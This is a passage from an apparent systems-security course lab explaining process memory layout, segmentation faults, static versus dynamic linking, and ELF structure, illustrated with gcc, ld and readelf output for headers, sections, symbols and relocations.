fffdd000-ffffe000 rw-p 00000000 00:00 0 [stack]
&lt;/code>&lt;/pre>&lt;p>As you can see, the big allocation is now towards the stack instead of towards the heap.&lt;/p>
&lt;p>Returning to the main functionality of the stack, remember from the previous lab that local variables are declared on the stack.
This translates into assembly code in the following way:&lt;/p>
&lt;pre tabindex="0">&lt;code>int main()
{
char buf[1000];
int i;
............
}
&lt;/code>&lt;/pre>&lt;p>The C snippet would be translated into ASM something like:&lt;/p>
&lt;pre tabindex="0">&lt;code>0804840c &amp;lt;main&amp;gt;:
804840c: 55 push ebp
804840d: 89 e5 mov ebp,esp
804840f: 81 ec f0 03 00 00 sub esp,0x3f0
..........
&lt;/code>&lt;/pre>&lt;p>The &lt;code>0x3f0&lt;/code> hex value is equal to &lt;code>1008&lt;/code> in decimal, which is precisely 1000 (from &lt;code>buf&lt;/code>) + 4 (from &lt;code>i&lt;/code>) + 4 (the storage of another int that the compiler used later in the code).&lt;/p>
&lt;p>As the program subtracts more from &lt;code>esp&lt;/code> the kernel will provide pages on-demand until the stack boundary or another mmap-ing is hit.
The kernel will, in this case, kill the application because of the Segmentation Fault.&lt;/p>
&lt;h3 id="segmentation-fault">Segmentation Fault&lt;/h3>
&lt;p>Now that we know everything about the memory address space we can say more about the infamous &lt;code>Segmentation Fault&lt;/code> that all of us have, at some time, encountered.
It is basically a permission violation.
Apart from the mappings that appear in &lt;code>/proc/&amp;lt;PID&amp;gt;/maps&lt;/code> with &lt;code>r--&lt;/code>, &lt;code>rw-&lt;/code>, etc, you can consider that everything else is &lt;code>---&lt;/code>.
Thus, a read access at such a location will violate the permission of that region so the whole app will be killed by the signal received (unless it has a signal handler).
Examples:&lt;/p>
&lt;ul>
&lt;li>Dereferencing a &lt;code>NULL&lt;/code> pointer will try to read from &lt;code>0x00000000&lt;/code> which is not (usually) mapped =&amp;gt; &lt;code>SIGSEGV&lt;/code> (read access on none)&lt;/li>
&lt;li>Writing after the end of a heap buffer (if the heap buffer is exactly at the end of a mapping) will determine writes into unmapped pages =&amp;gt; SIGSEGV (write access on none)&lt;/li>
&lt;li>Trying to write to &lt;code>.rodata&lt;/code> =&amp;gt; SIGSEGV (write access on read only)&lt;/li>
&lt;li>Overwriting the stack with &amp;ldquo;AAAAAAAAAAAAAAAAAAA&amp;rdquo; will also overwrite the return address and make the execution go to &lt;code>0x41414141&lt;/code> =&amp;gt; SIGSEGV (execute access on none)&lt;/li>
&lt;li>Overwriting the stack and return address with another address to a shellcode on the stack =&amp;gt; SIGSEGV (execute access on read/write only)&lt;/li>
&lt;li>Trying to rewrite the binary (&lt;code>int *v = main; *v = 0x90909090;&lt;/code>) =&amp;gt; SIGSEGV (write access on read/execute only)&lt;/li>
&lt;/ul>
&lt;h2 id="tutorials">Tutorials&lt;/h2>
&lt;p>This session is focused on the transformation of an &lt;strong>ELF file&lt;/strong> (stored on disk) as it is loaded into memory and becomes &lt;strong>a process&lt;/strong> (stored into memory).
We will first analyze the structure of an &lt;strong>ELF file&lt;/strong> and how this structure evolves when going from &lt;strong>C source code&lt;/strong>, to &lt;strong>object file&lt;/strong> and then to either &lt;strong>an executable&lt;/strong> or &lt;strong>a shared library&lt;/strong>.
We will also skim over how various elements are interpreted by the &lt;strong>linker&lt;/strong> and the &lt;strong>loader&lt;/strong>.
Finally, we will see the layout of a process once it is loaded into memory.&lt;/p>
&lt;h3 id="big-picture-view">Big Picture View&lt;/h3>
&lt;p>Sun Microsystems&amp;rsquo; SunOS came up with the concept of dynamic shared libraries and introduced it to UNIX in the late 1980s.
UNIX System V Release 4, which Sun co-developed, introduced the ELF object format adaptation from the Sun scheme.
Later it was developed and published as part of the ABI (Application Binary Interface) as an improvement over COFF, the previous object format and by the late 1990s it had become the standard for UNIX and UNIX-like systems including Linux and BSD derivatives.
Depending on processor architectures, several specifications have emerged with minor changes, but for this session we will be focusing on the &lt;a href="http://www.skyfree.org/linux/references/ELF_Format.pdf">ELF-32&lt;/a> format.&lt;/p>
&lt;p>&lt;img src="assets/elf-link-exec.png" alt="Linking View and Execution View">&lt;/p>
&lt;p>The structure of an ELF file during the linking process is the same with that of an object file.
The linking process involves collecting and combining code and data into a single file that will later be loaded into memory and executed.
On the right hand side we can see how the the ELF file structure will be transformed in memory.
&lt;strong>Sections&lt;/strong> instruct the Linker while &lt;strong>Segments&lt;/strong> instruct the Operating System.&lt;/p>
&lt;p>&lt;img src="assets/elf-merging.png" alt="ELF Merging">&lt;/p>
&lt;p>As we can see, the information inside the two program headers and the section headers gets merged as needed inside the more familiar program segments.
The basic role of the ELF file format is to serve as a roadmap for the linker and the OS Loader to generate a running process.&lt;/p>
&lt;h3 id="staticdynamic-linking">Static/Dynamic linking&lt;/h3>
&lt;p>Out of practical considerations, for very large programs, even early on, it was very impractical to store all of the source code inside a single file.
One of the most mundane of all actions, namely splitting your source code into functions across multiple files while still obtaining a valid running program was a difficult engineering challenge.
The initial paradigm was called &lt;strong>static linking&lt;/strong> and was the only option inside the COFF file format.
It involves interpreting each piece of code from each file and then merging all the information inside a single binary that would contain all the machine code necessary for the program.
This way of doing things, still in use today, involves loading all of the code and data into memory regardless of use case.
This basically meant that, the required resources to run a program were determined by the number of instances, with no possibility of optimization.
Running 10 instances of the same program meant that there was a lot of code duplication going on in the memory space.&lt;/p>
&lt;p>&lt;img src="assets/elf-static-linking.png" alt="ELF Static Linking">&lt;/p>
&lt;p>Along with the ELF format came a new way of doing things.
Instead of linking all the source files that contained subroutines into the final binaries, separate binaries were organized in libraries that could be loaded per use case, on demand.
Essentially, the libraries were loaded only once into memory and when a program instance required a subroutine from a specific library it would inquire a special OS component about it and new resources would be allocated only for the volatile parts of the library image (&lt;code>.bss&lt;/code> and &lt;code>.data&lt;/code>).
The new process allowed for a much more efficient resource utilization and was named dynamic linking and the new type of library files were called shared objects.
Running 10 instances of the same program now meant that only the volatile parts of those binaries would be duplicated.
In cases where the same code can be reused, it is allocated only once and used by multiple instances of the same program.&lt;/p>
&lt;p>&lt;img src="assets/elf-dynamic-linking.png" alt="ELF Dynamic Linking">&lt;/p>
&lt;h3 id="elf-types">ELF Types&lt;/h3>
&lt;p>There are several ELF types but the most common types we will be dealing with are:&lt;/p>
&lt;ul>
&lt;li>Relocatable Files&lt;/li>
&lt;li>Shared Objects&lt;/li>
&lt;li>Executable Files&lt;/li>
&lt;/ul>
&lt;h4 id="elf-type---relocatable-files">ELF Type - Relocatable Files&lt;/h4>
&lt;p>Relocatable files are obtained using the core compiler and basically contain all the ELF information necessary except for data like external variables or subroutines that are present in other files.&lt;/p>
&lt;pre tabindex="0">&lt;code>gcc -c -o reloc.o source.c
gcc -c -fPIC -o reloc.o source.c
&lt;/code>&lt;/pre>&lt;p>The first command will produce a relocatable file that will later constitute an executable or a static library.
If we want to use the relocatable file to later create a shared library we need to use the second variant to create a relocatable file that has &lt;a href="https://wiki.gentoo.org/wiki/Hardened/Introduction_to_Position_Independent_Code">Position Independent Code&lt;/a> (PIC).&lt;/p>
&lt;h4 id="elf-type---shared-objects">ELF Type - Shared Objects&lt;/h4>
&lt;p>Shared libraries are loaded up at runtime as needed by an OS component named the dynamic loader.
Shared objects may include other shared objects and this aspect is very important because, when loading specific subroutines, the ELF file must provide its dependencies.
As such, the process of dynamic linking does a breadth first search gradually building the full dependency list.&lt;/p>
&lt;p>&lt;img src="assets/elf-dependency.png" alt="Shared Objects">&lt;/p>
&lt;p>You can view the list of shared object dependencies for any given binary as well as the addresses where they will be loaded in memory by using the &lt;code>ldd&lt;/code> command.&lt;/p>
&lt;pre tabindex="0">&lt;code>ldd /bin/ls
linux-gate.so.1 =&amp;gt; (0x00e02000)
librt.so.1 =&amp;gt; /lib/tls/i686/cmov/librt.so.1 (0x004f9000)
libselinux.so.1 =&amp;gt; /lib/libselinux.so.1 (0x00c62000)
libacl.so.1 =&amp;gt; /lib/libacl.so.1 (0x00a87000)
libc.so.6 =&amp;gt; /lib/tls/i686/cmov/libc.so.6 (0x00110000)
libpthread.so.0 =&amp;gt; /lib/tls/i686/cmov/libpthread.so.0 (0x00325000)
/lib/ld-linux.so.2 (0x00a45000)
libdl.so.2 =&amp;gt; /lib/tls/i686/cmov/libdl.so.2 (0x0077d000)
libattr.so.1 =&amp;gt; /lib/libattr.so.1 (0x00dd7000)
&lt;/code>&lt;/pre>&lt;p>All libraries should adhere to a strict naming convention.
Shared objects have two names:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>soname&lt;/strong> - that consists of the prefix &lt;code>lib&lt;/code>, followed by the library name, then a &lt;code>.so&lt;/code>, another dot, then the major version (e.g. &lt;code>libtest.so.1&lt;/code>)&lt;/li>
&lt;li>&lt;strong>real name&lt;/strong> - is actually a file name, that usually extends the &lt;strong>soname&lt;/strong> by adding a dot and minor version number along with the release version (e.g. &lt;code>libtest.so.1.23.3&lt;/code>)&lt;/li>
&lt;/ul>
&lt;p>Additionally, each library source file should have an accompanying header file with the extension &lt;code>.h&lt;/code> and the same name.&lt;/p>
&lt;p>Adhering to these naming conventions is quite important as dependencies are resolved based on the &lt;strong>soname&lt;/strong>.&lt;/p>
&lt;pre tabindex="0">&lt;code>gcc -c -fPIC libtesting.c
ld -shared -soname libtesting.so.1 -o libtesting.so.1.0 -lc libtesting.o
ldconfig -v -n .
ln -sf libtesting.so.1 libtesting.so
export LD_LIBRARY_PATH=.:&amp;#34;$LD_LIBRARY_PATH&amp;#34;
gcc -o main_program main_program.c -L. -ltesting
&lt;/code>&lt;/pre>&lt;p>The first line creates an object file with position independent code.
The second line will create the shared object with &lt;strong>soname&lt;/strong> &lt;code>libtesting.so.1&lt;/code> and a real file name of &lt;code>libtesting.so.1.0&lt;/code> by using the linker.
Shared objects are usually installed in other directories but the line containing &lt;code>ldconfig&lt;/code>, will install it in the current directory.
At runtime the standard directories like &lt;code>/usr/lib&lt;/code> are searched, but we add the local directory to the search path by modifying the &lt;code>LD_LIBRARY_PATH&lt;/code> environment variable.&lt;/p>
&lt;p>Finally, the executable is created by dynamic linking against the shared object.&lt;/p>
&lt;p>A good tutorial on how to create a basic shared object can be found &lt;a href="https://www.ibm.com/developerworks/library/l-shobj/">here&lt;/a>.&lt;/p>
&lt;h4 id="elf-type---executable-files">ELF Type - Executable Files&lt;/h4>
&lt;p>They are regarded as the end result and contain all the information necessary to create a running process.&lt;/p>
&lt;h3 id="elf-structure">ELF Structure&lt;/h3>
&lt;p>The following wiki sections on ELF structure are dense and are &lt;strong>not&lt;/strong> meant to be known by heart.
&lt;strong>Do not&lt;/strong> try to read them all at once and memorize them, but rather use the following chapters as &lt;strong>reference&lt;/strong>.&lt;/p>
&lt;p>Tools of the trade are:&lt;/p>
&lt;ul>
&lt;li>readelf&lt;/li>
&lt;li>objdump&lt;/li>
&lt;li>ldd&lt;/li>
&lt;li>Ghidra/IDA (Ghidra is Open Source, while IDA is not and it is really expensive)&lt;/li>
&lt;/ul>
&lt;p>The command outputs that follow are rather large so we will only be discussing the less obvious parts.
We will also leave out information that&amp;rsquo;s not really that important or generally weird.&lt;/p>
&lt;h4 id="elf-header">ELF Header&lt;/h4>
&lt;p>Using &lt;code>readelf&lt;/code> is straight-forward enough:&lt;/p>
&lt;pre tabindex="0">&lt;code>readelf -h program
ELF Header:
Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
Class: ELF32
Data: 2&amp;#39;s complement, little endian
Version: 1 (current)
OS/ABI: UNIX - System V
ABI Version: 0
Type: EXEC (Executable file)
Machine: Intel 80386
Version: 0x1
Entry point address: 0x8048330
Start of program headers: 52 (bytes into file)
Start of section headers: 4392 (bytes into file)
Flags: 0x0
Size of this header: 52 (bytes)
Size of program headers: 32 (bytes)
Number of program headers: 8
Size of section headers: 40 (bytes)
Number of section headers: 30
Section header string table index: 27
&lt;/code>&lt;/pre>&lt;p>Below we will discuss the less evident aspects of the above output&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Elf Identification&lt;/strong> (16 bytes)
&lt;ul>
&lt;li>&lt;strong>Magic&lt;/strong> - the first bytes of the binary that identify the file as ELF&lt;/li>
&lt;li>&lt;strong>Class&lt;/strong> - identifies the type of ELF (ex: ELF-32, ELF-64)&lt;/li>
&lt;li>&lt;strong>Data&lt;/strong> - specifies the type of data encoding&lt;/li>
&lt;li>&lt;strong>Version&lt;/strong> - version of the ELF header&lt;/li>
&lt;li>&lt;strong>OS/ABI&lt;/strong> - version of the OS&lt;/li>
&lt;li>&lt;strong>ABI&lt;/strong> - version of the ABI specification&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Type&lt;/strong> - Relocatable, Executable, Shared Object&lt;/li>
&lt;li>&lt;strong>Machine&lt;/strong> - Required Machine architecture to run the executable&lt;/li>
&lt;li>&lt;strong>Entry Point Address&lt;/strong> - the memory address where the OS loader transfers control to the process code for the first time.&lt;/li>
&lt;li>&lt;strong>Start of Program Headers&lt;/strong> - File offset where the array of program headers start&lt;/li>
&lt;li>&lt;strong>Start of Section Headers&lt;/strong> - File offset where the array of section headers starts&lt;/li>
&lt;li>&lt;strong>Section Header String Table Index&lt;/strong> - the index in the section table name where the information about the section name string table can be found&lt;/li>
&lt;/ul>
&lt;h4 id="program-headers">Program Headers&lt;/h4>
&lt;p>&lt;strong>Program Headers&lt;/strong> are only present inside &lt;strong>Executable&lt;/strong> and &lt;strong>Shared Object&lt;/strong> files.&lt;/p>
&lt;p>Again, &lt;code>readelf&lt;/code> is used with minimum syntax:&lt;/p>
&lt;pre tabindex="0">&lt;code>readelf -l program
Elf file type is EXEC (Executable file)
Entry point 0x8048330
There are 8 program headers, starting at offset 52
Program Headers:
Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align
PHDR 0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
INTERP 0x000134 0x08048134 0x08048134 0x00013 0x00013 R 0x1
[Requesting program interpreter: /lib/ld-linux.so.2]
LOAD 0x000000 0x08048000 0x08048000 0x004e4 0x004e4 R E 0x1000
LOAD 0x000f0c 0x08049f0c 0x08049f0c 0x00108 0x00110 RW 0x1000
DYNAMIC 0x000f20 0x08049f20 0x08049f20 0x000d0 0x000d0 RW 0x4
NOTE 0x000148 0x08048148 0x08048148 0x00044 0x00044 R 0x4
GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x4
GNU_RELRO 0x000f0c 0x08049f0c 0x08049f0c 0x000f4 0x000f4 R 0x1
Section to Segment mapping:
Segment Sections...
00
01 .interp
02 .interp .note.ABI-tag .note.gnu.build-id .hash .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame
03 .ctors .dtors .jcr .dynamic .got .got.plt .data .bss
04 .dynamic
05 .note.ABI-tag .note.gnu.build-id
06
07 .ctors .dtors .jcr .dynamic .got
&lt;/code>&lt;/pre>&lt;p>The &lt;strong>Program Header&lt;/strong> table features an array of structures that shows how parts of the file will be mapped into memory at runtime.
The last parts of the output show what sections will be merged into various program headers before loading the ELF into memory and becoming segments.&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Type&lt;/strong>
&lt;ul>
&lt;li>&lt;strong>PHDR&lt;/strong> - information about the program header table itself&lt;/li>
&lt;li>&lt;strong>INTERP&lt;/strong> - information about the null terminated string that specifies the path to the dynamic loader.
This header is only present in executable that use shared object code&lt;/li>
&lt;li>&lt;strong>LOAD&lt;/strong> - use to specify a general purpose loadable segment&lt;/li>
&lt;li>&lt;strong>DYNAMIC&lt;/strong> - information necessary to the dynamic linking process&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Offset&lt;/strong> - offset from the beginning of the file where the segment begins&lt;/li>
&lt;li>&lt;strong>VirtAddr&lt;/strong> - the address where the segment will start in memory&lt;/li>
&lt;li>&lt;strong>FileSz&lt;/strong> - number of bytes occupied by the segment on disk&lt;/li>
&lt;li>&lt;strong>MemSiz&lt;/strong> - number of bytes occupied by the segment in memory&lt;/li>
&lt;li>&lt;strong>Align&lt;/strong> - specifies a boundary to which the segments are aligned on file and in memory&lt;/li>
&lt;/ul>
&lt;p>Here are two resources to read about &lt;a href="https://www.airs.com/blog/archives/189">GNU_RELRO&lt;/a> and &lt;a href="https://guru.multimedia.cx/pt_gnu_stack/">GNU_STACK&lt;/a> &lt;strong>Program Headers&lt;/strong>.&lt;/p>
&lt;h4 id="section-table">Section Table&lt;/h4>
&lt;p>Section headers are the central piece of reference used to organize the ELF files both on disk and in memory.&lt;/p>
&lt;pre tabindex="0">&lt;code>readelf -S program
There are 30 section headers, starting at offset 0x1128:
Section Headers:
[Nr] Name Type Addr Off Size ES Flg Lk Inf Al
[ 0] NULL 00000000 000000 000000 00 0 0 0
[ 1] .interp PROGBITS 08048134 000134 000013 00 A 0 0 1
[ 2] .note.ABI-tag NOTE 08048148 000148 000020 00 A 0 0 4
[ 3] .note.gnu.build-i NOTE 08048168 000168 000024 00 A 0 0 4
[ 4] .hash HASH 0804818c 00018c 000028 04 A 6 0 4
[ 5] .gnu.hash GNU_HASH 080481b4 0001b4 000020 04 A 6 0 4
[ 6] .dynsym DYNSYM 080481d4 0001d4 000050 10 A 7 1 4
[ 7] .dynstr STRTAB 08048224 000224 00004c 00 A 0 0 1
[ 8] .gnu.version VERSYM 08048270 000270 00000a 02 A 6 0 2
[ 9] .gnu.version_r VERNEED 0804827c 00027c 000020 00 A 7 1 4
[10] .rel.dyn REL 0804829c 00029c 000008 08 A 6 0 4
[11] .rel.plt REL 080482a4 0002a4 000018 08 A 6 13 4
[12] .init PROGBITS 080482bc 0002bc 000030 00 AX 0 0 4
[13] .plt PROGBITS 080482ec 0002ec 000040 04 AX 0 0 4
[14] .text PROGBITS 08048330 000330 00017c 00 AX 0 0 16
[15] .fini PROGBITS 080484ac 0004ac 00001c 00 AX 0 0 4
[16] .rodata PROGBITS 080484c8 0004c8 000015 00 A 0 0 4
[17] .eh_frame PROGBITS 080484e0 0004e0 000004 00 A 0 0 4
[18] .ctors PROGBITS 08049f0c 000f0c 000008 00 WA 0 0 4
[19] .dtors PROGBITS 08049f14 000f14 000008 00 WA 0 0 4
[20] .jcr PROGBITS 08049f1c 000f1c 000004 00 WA 0 0 4
[21] .dynamic DYNAMIC 08049f20 000f20 0000d0 08 WA 7 0 4
[22] .got PROGBITS 08049ff0 000ff0 000004 04 WA 0 0 4
[23] .got.plt PROGBITS 08049ff4 000ff4 000018 04 WA 0 0 4
[24] .data PROGBITS 0804a00c 00100c 000008 00 WA 0 0 4
[25] .bss NOBITS 0804a014 001014 000008 00 WA 0 0 4
[26] .comment PROGBITS 00000000 001014 000023 01 MS 0 0 1
[27] .shstrtab STRTAB 00000000 001037 0000ee 00 0 0 1
[28] .symtab SYMTAB 00000000 0015d8 000410 10 29 45 4
[29] .strtab STRTAB 00000000 0019e8 0001fd 00 0 0 1
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;strong>Name&lt;/strong> - is obtained by reading the value of the section names table at the specified index&lt;/li>
&lt;li>&lt;strong>Type&lt;/strong>
&lt;ul>
&lt;li>&lt;strong>PROGBITS&lt;/strong> - information that is given meaning by the program when loaded into memory&lt;/li>
&lt;li>&lt;strong>NOBITS&lt;/strong> - similar to PROGBITS in meaning but occupies no space in the file&lt;/li>
&lt;li>&lt;strong>STRTAB&lt;/strong> - contains the program string table&lt;/li>
&lt;li>&lt;strong>SYMTAB&lt;/strong> - contains the symbol table&lt;/li>
&lt;li>&lt;strong>DYNAMIC&lt;/strong> - holds information necessary for dynamic linking&lt;/li>
&lt;li>&lt;strong>DYNSYM&lt;/strong> - holds a set of symbols used in the dynamic linking process&lt;/li>
&lt;li>&lt;strong>REL&lt;/strong> - holds relocation entries&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Addr&lt;/strong> - if the section is part of an executable it will hold the virtual address where the section could be found in memory.
If not it would be 0.&lt;/li>
&lt;li>&lt;strong>Off&lt;/strong> - offset from the beginning of the file to where the section starts&lt;/li>
&lt;li>&lt;strong>Size&lt;/strong> - size of the section in bytes&lt;/li>
&lt;li>&lt;strong>ES&lt;/strong> - size in bytes per entry, if fixed entry size is used&lt;/li>
&lt;li>&lt;strong>FLG&lt;/strong>&lt;/li>
&lt;li>&lt;strong>X&lt;/strong> - contains executable code&lt;/li>
&lt;li>&lt;strong>W&lt;/strong> - contains writable code&lt;/li>
&lt;li>&lt;strong>A&lt;/strong> - will be loaded into memory as-is during process execution&lt;/li>
&lt;li>&lt;strong>Al&lt;/strong> - section alignment constraints&lt;/li>
&lt;/ul>
&lt;p>The &lt;strong>Inf&lt;/strong> and &lt;strong>Lnk&lt;/strong> columns have specific interpretations depending on the section type, as can be seen in the following image:&lt;/p>
&lt;p>&lt;img src="assets/elf-sect-inf.png" alt="ELF Sections Inf and Lnk">&lt;/p>
&lt;p>Additionally, the raw contents of each section can be dumped using both &lt;code>objdump&lt;/code> and &lt;code>readelf&lt;/code>.&lt;/p>
&lt;pre tabindex="0">&lt;code>readelf -x .got program
Hex dump of section &amp;#39;.got&amp;#39;:
0x08049ff0 00000000 ....
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>objdump -s -j &amp;#34;.got&amp;#34; program
program: file format elf32-i386
Contents of section .got:
8049ff0 00000000 ....
&lt;/code>&lt;/pre>&lt;p>For more details about the kind of data stored by ELF sections, refer to this &lt;a href="https://refspecs.linuxfoundation.org/LSB_3.0.0/LSB-Core-generic/LSB-Core-generic/specialsections.html">resource&lt;/a>.&lt;/p>
&lt;p>When trying to dump contents of section using readelf you can interpret the output like strings by using the &lt;code>-p&lt;/code> flag.&lt;/p>
&lt;h4 id="symbol-table">Symbol Table&lt;/h4>
&lt;p>One of the initial goals of the ELF format was to enable dynamic linking.
Given the machine code of a binary, various elements inside it will use absolute addresses that are based on the memory address where the binary expects to be loaded.
The entire idea of shared libraries is that these can be loaded and unloaded on demand inside the memory space of whichever process needs them at whichever address is available.
As such, a map of how to locate and relocate absolute data points inside the machine code is needed and that&amp;rsquo;s where the symbol table comes in.&lt;/p>
&lt;pre tabindex="0">&lt;code>readelf -s libtesting.so.1
Symbol table &amp;#39;.dynsym&amp;#39; contains 8 entries:
Num: Value Size Type Bind Vis Ndx Name
0: 00000000 0 NOTYPE LOCAL DEFAULT UND
1: 00001339 1 OBJECT GLOBAL DEFAULT 12 cPub
2: 000001f8 10 FUNC GLOBAL DEFAULT 7 fPub
3: 0000020c 100 FUNC GLOBAL DEFAULT 7 foo
4: 00001328 16 OBJECT GLOBAL DEFAULT 11 a
5: 00001338 0 NOTYPE GLOBAL DEFAULT ABS __bss_start
6: 0000133c 0 NOTYPE GLOBAL DEFAULT ABS _end
7: 00001338 0 NOTYPE GLOBAL DEFAULT ABS _edata
Symbol table &amp;#39;.symtab&amp;#39; contains 27 entries:
Num: Value Size Type Bind Vis Ndx Name
0: 00000000 0 NOTYPE LOCAL DEFAULT UND
1: 000000b4 0 SECTION LOCAL DEFAULT 1
2: 000000e8 0 SECTION LOCAL DEFAULT 2
3: 00000168 0 SECTION LOCAL DEFAULT 3
4: 000001a8 0 SECTION LOCAL DEFAULT 4
5: 000001d0 0 SECTION LOCAL DEFAULT 5
6: 000001d8 0 SECTION LOCAL DEFAULT 6
7: 000001f8 0 SECTION LOCAL DEFAULT 7
8: 00001274 0 SECTION LOCAL DEFAULT 8
9: 00001314 0 SECTION LOCAL DEFAULT 9
10: 00001318 0 SECTION LOCAL DEFAULT 10
11: 00001328 0 SECTION LOCAL DEFAULT 11
12: 00001338 0 SECTION LOCAL DEFAULT 12
13: 00000000 0 SECTION LOCAL DEFAULT 13
14: 00000000 0 FILE LOCAL DEFAULT ABS libtesting.c
15: 00000202 10 FUNC LOCAL DEFAULT 7 fLocal
16: 00001338 1 OBJECT LOCAL DEFAULT 12 cLocal
17: 00001318 0 OBJECT LOCAL HIDDEN ABS _GLOBAL_OFFSET_TABLE_
18: 00000270 0 FUNC LOCAL HIDDEN 7 __i686.get_pc_thunk.bx
19: 00001274 0 OBJECT LOCAL HIDDEN ABS _DYNAMIC
20: 00001339 1 OBJECT GLOBAL DEFAULT 12 cPub
21: 000001f8 10 FUNC GLOBAL DEFAULT 7 fPub
22: 0000020c 100 FUNC GLOBAL DEFAULT 7 foo
23: 00001328 16 OBJECT GLOBAL DEFAULT 11 a
24: 00001338 0 NOTYPE GLOBAL DEFAULT ABS __bss_start
25: 0000133c 0 NOTYPE GLOBAL DEFAULT ABS _end
26: 00001338 0 NOTYPE GLOBAL DEFAULT ABS _edata
&lt;/code>&lt;/pre>&lt;p>Some information on the symbols that may belong to external files or may be referenced by external files during dynamic linking are copied in the &lt;code>.dynsym&lt;/code> section.&lt;/p>
&lt;ul>
&lt;li>Name - symbol name&lt;/li>
&lt;li>Type
&lt;ul>
&lt;li>NoType - not specified&lt;/li>
&lt;li>FUNC - the symbol influences a function&lt;/li>
&lt;li>SECTION - associated with a section&lt;/li>
&lt;li>FILE - a symbol that references a files&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Bind
&lt;ul>
&lt;li>LOCAL - the symbol information is not visible outside the object file&lt;/li>
&lt;li>GLOBAL - the symbol is visible to all the files being combined to form the executable&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Size - the size of the symbol in bytes or 0 if it is unknown&lt;/li>
&lt;li>Ndx
&lt;ul>
&lt;li>UND - unspecified section reference&lt;/li>
&lt;li>COM - unallocated C external variable&lt;/li>
&lt;li>ABS - an absolute value for the reference&lt;/li>
&lt;li>value - an index into the section table&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Value - if the symbol table is part of an executable, the value will contain a memory address where the symbol resides.
Otherwise it will contain an offset from the beginning of the section referenced by Ndx or O.&lt;/li>
&lt;/ul>
&lt;p>As you can see, the symbol table as it appears in object files compiled with gcc is quite verbose, revealing function names and visibility as well as variable scopes, names and even sizes.
In its default form it even shows the name of the sourcefile.&lt;/p>
&lt;p>In order to subvert Reverse Engineering attempts you can check out some of the methods of stripping the symbol table of valuable information:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html">A Whirlwind Tutorial on Creating Really Teensy ELF Executables for Linux&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sourceware.org/binutils/docs/binutils/strip.html">strip&lt;/a>&lt;/li>
&lt;/ul>
&lt;h4 id="relocations">Relocations&lt;/h4>
&lt;p>Relocations were a concept that was present ever since the invention of static linking.
The initial purpose of relocations was to give the static linker a roadmap when combining multiple object files into a binary by stating:&lt;/p>
&lt;ul>
&lt;li>The &lt;strong>Symbol&lt;/strong> that needs to be fixed.&lt;/li>
&lt;li>&lt;strong>Where&lt;/strong> you can find the symbol (file/section offset).&lt;/li>
&lt;li>An &lt;strong>Algorithm&lt;/strong> for making the fixes.&lt;/li>
&lt;/ul>
&lt;p>The fixes would usually be made in the &lt;code>.data&lt;/code> and &lt;code>.text&lt;/code> sections and everything was well.
Dynamic runtime brought a bit of a complication to modifications that needed to be made in the code segments.
The whole idea of shared libraries is that the code can be loaded once into memory from an ELF file then shared among all the processes that use the library.
The only way to reliably do this is to make the code section read-only.&lt;/p>
&lt;p>In order to compensate for this constraint a special data section called the &lt;strong>GOT&lt;/strong> (Global Offset Table) was created.
When the code needs to work with a symbol that belongs to shared object, in the code entry for that symbol uses addresses from the &lt;strong>GOT&lt;/strong> table.
First time the symbol is referenced the dynamic linker corrects the entry in GOT and on subsequent calls the correct address will be used.&lt;/p>
&lt;p>When implementing calls to subroutines in shared objects, a different table is used called the &lt;strong>PLT&lt;/strong> (Procedure Linkage Table).
The initial call is made to a stub sequence in the &lt;strong>PLT&lt;/strong> which bounces off a &lt;strong>GOT&lt;/strong> entry in order to push the subroutine name on the stack and then calls the resolver (mentioned in the &lt;strong>INTERP&lt;/strong> program header).&lt;/p>
&lt;p>Relocations and how they get applied are very complex topic and we will only try to cover as far is helps detecting file and symbol types If you want to read more you can refer to some of these resources:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="http://www.mindfruit.co.uk/2012/06/relocations-relocations.html">Some Assembly Required&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://netwinder.osuosl.org/users/p/patb/public_html/elf_relocs.html">Study Of ELF Loading and Relocs&lt;/a>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>readelf -r libdynamic.o
Relocation section &amp;#39;.rel.text&amp;#39; at offset 0x5f8 contains 8 entries:
Offset Info Type Sym.Value Sym. Name
0000001d 00001402 R_386_PC32 00000000 __i686.get_pc_thunk.bx
00000023 0000150a R_386_GOTPC 00000000 _GLOBAL_OFFSET_TABLE_
00000029 00000409 R_386_GOTOFF 00000000 .bss
0000002f 00000409 R_386_GOTOFF 00000000 .bss
00000035 00000d03 R_386_GOT32 00000004 so_int_global
00000041 00000d03 R_386_GOT32 00000004 so_int_global
00000052 00000e04 R_386_PLT32 00000000 so_fpublic_global
0000005b 00000209 R_386_GOTOFF 00000000 .text
Relocation section &amp;#39;.rel.data.rel.local&amp;#39; at offset 0x638 contains 2 entries:
Offset Info Type Sym.Value Sym. Name
00000000 00000401 R_386_32 00000000 .bss
00000004 00000201 R_386_32 00000000 .text
Relocation section &amp;#39;.rel.data.rel&amp;#39; at offset 0x648 contains 2 entries:
Offset Info Type Sym.Value Sym. Name
00000000 00000d01 R_386_32 00000004 so_int_global
00000004 00000e01 R_386_32 00000000 so_fpublic_global
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;strong>Offset&lt;/strong> - In relocatable files and linked shared objects it contains the offset from the beginning of the section , where the relocation needs to be applied&lt;/li>
